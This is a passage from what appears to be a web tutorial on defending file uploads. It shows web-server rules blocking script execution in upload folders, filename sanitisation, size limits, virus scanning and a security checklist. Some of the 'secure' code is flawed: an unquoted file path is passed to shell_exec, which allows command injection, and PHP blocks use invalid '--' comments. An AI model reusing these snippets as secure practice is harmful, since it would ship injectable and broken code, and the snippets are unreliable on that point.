    <span class="code-tag">AddHandler</span> cgi-script .php .php3 .php4 .phtml .pl .py .jsp .asp .aspx .sh .cgi
    <span class="code-tag">&lt;FilesMatch</span> <span class="code-string">"\.(?i:php|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|sh|cgi)$"</span><span class="code-tag">&gt;</span>
        <span class="code-tag">Order</span> allow,deny
        <span class="code-tag">Deny</span> from all
    <span class="code-tag">&lt;/FilesMatch&gt;</span>
    <span class="code-tag">php_flag</span> engine off
<span class="code-tag">&lt;/Directory&gt;</span>

<span class="code-comment">-- Nginx configuration</span>
<span class="code-attr">location</span> <span class="code-string">^~ /uploads/</span> {
    <span class="code-attr">root</span> <span class="code-string">/var/www;</span>
    
    <span class="code-comment"># Disable PHP execution</span>
    <span class="code-attr">location</span> <span class="code-string">~* \.(php|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|sh|cgi)$</span> {
        <span class="code-attr">deny</span> <span class="code-string">all;</span>
        <span class="code-attr">return</span> <span class="code-keyword">403</span>;
    }
    
    <span class="code-comment"># Force download instead of execution</span>
    <span class="code-attr">add_header</span> <span class="code-string">Content-Disposition "attachment";</span>
}

<span class="code-comment">-- Store files outside web root</span>
<span class="code-string">/var/www/html/</span>          <span class="code-comment">-- Web root</span>
<span class="code-string">/var/www/uploads/</span>       <span class="code-comment">-- Upload directory (NOT accessible via web)</span>
<span class="code-string">/var/www/private/</span>       <span class="code-comment">-- Secure storage</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Filename Sanitization</h3>
        <p class="text-content">
          Never use user-provided filenames. Generate random names and strip all path information.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Filename Handling</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Generate cryptographically secure random filename</span>
<span class="code-keyword">$extension</span> = <span class="code-function">strtolower</span>(<span class="code-function">pathinfo</span>(<span class="code-keyword">$original_name</span>, <span class="code-function">PATHINFO_EXTENSION</span>));
<span class="code-keyword">$new_filename</span> = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">16</span>)) . <span class="code-string">'.'</span> . <span class="code-keyword">$extension</span>;

<span class="code-comment">// Or use UUID</span>
<span class="code-keyword">$new_filename</span> = <span class="code-function">sprintf</span>(<span class="code-string">'%s.%s'</span>, 
    <span class="code-function">uuid_create</span>(<span class="code-function">UUID_TYPE_RANDOM</span>), 
    <span class="code-keyword">$extension</span>
);

<span class="code-comment">// Strip path components</span>
<span class="code-keyword">$safe_name</span> = <span class="code-function">basename</span>(<span class="code-keyword">$filename</span>);  <span class="code-comment">// Remove path traversal</span>

<span class="code-comment">// Additional sanitization</span>
<span class="code-keyword">$safe_name</span> = <span class="code-function">preg_replace</span>(<span class="code-string">'/[^a-zA-Z0-9._-]/'</span>, <span class="code-string">''</span>, <span class="code-keyword">$safe_name</span>);

<span class="code-comment">// Never trust original extension - derive from MIME type</span>
<span class="code-keyword">$extension_map</span> = [
    <span class="code-string">'image/jpeg'</span> => <span class="code-string">'jpg'</span>,
    <span class="code-string">'image/png'</span> => <span class="code-string">'png'</span>,
    <span class="code-string">'image/gif'</span> => <span class="code-string">'gif'</span>
];
<span class="code-keyword">$extension</span> = <span class="code-keyword">$extension_map</span>[<span class="code-keyword">$mime_type</span>] ?? <span class="code-keyword">null</span>;
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Additional Security Measures</h3>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Comprehensive Security Controls</span></div>
          <pre><code><span class="code-comment">-- File size limits</span>
<span class="code-keyword">$max_size</span> = <span class="code-keyword">5</span> * <span class="code-keyword">1024</span> * <span class="code-keyword">1024</span>; <span class="code-comment">// 5MB</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'size'</span>] > <span class="code-keyword">$max_size</span>) {
    <span class="code-keyword">die</span>(<span class="code-string">"File too large"</span>);
}

<span class="code-comment">-- Virus scanning (ClamAV integration)</span>
<span class="code-keyword">$scanner</span> = <span class="code-keyword">new</span> <span class="code-function">ClamAV</span>();
<span class="code-keyword">if</span> (!<span class="code-keyword">$scanner</span>-><span class="code-function">scan</span>(<span class="code-keyword">$file_path</span>)) {
    <span class="code-keyword">die</span>(<span class="code-string">"Virus detected"</span>);
}

<span class="code-comment">-- Content Security Policy headers</span>
<span class="code-function">header</span>(<span class="code-string">"Content-Security-Policy: default-src 'none'; sandbox"</span>);

<span class="code-comment">-- Rate limiting</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$user_upload_count</span> > <span class="code-keyword">10</span>) {
    <span class="code-keyword">die</span>(<span class="code-string">"Upload limit exceeded"</span>);
}

<span class="code-comment">-- Audit logging</span>
<span class="code-function">error_log</span>(<span class="code-function">sprintf</span>(
    <span class="code-string">"Upload: user=%s file=%s size=%d ip=%s"</span>,
    <span class="code-keyword">$user_id</span>,
    <span class="code-keyword">$new_filename</span>,
    <span class="code-keyword">$file_size</span>,
    <span class="code-keyword">$_SERVER</span>[<span class="code-string">'REMOTE_ADDR'</span>]
));

<span class="code-comment">-- Remove EXIF data to prevent metadata leaks</span>
<span class="code-function">shell_exec</span>(<span class="code-string">"exiftool -all= $file_path"</span>);</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Extension Whitelist</td>
              <td style="padding: 0.75rem;">Allow only known safe extensions</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">MIME Validation</td>
              <td style="padding: 0.75rem;">Server-side MIME type verification</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Magic Bytes</td>
              <td style="padding: 0.75rem;">Verify file signatures match extension</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Image Reprocessing</td>
              <td style="padding: 0.75rem;">Recreate image to strip embedded code</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Secure Storage</td>
              <td style="padding: 0.75rem;">Outside web root, no execution permissions</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Random Filenames</td>
              <td style="padding: 0.75rem;">Never use original filenames</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Size Limits</td>
              <td style="padding: 0.75rem;">Prevent DoS via large uploads</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Monitoring</td>
              <td style="padding: 0.75rem;">Log uploads, alert on anomalies</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Defense in Depth for File Uploads</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete secure upload implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>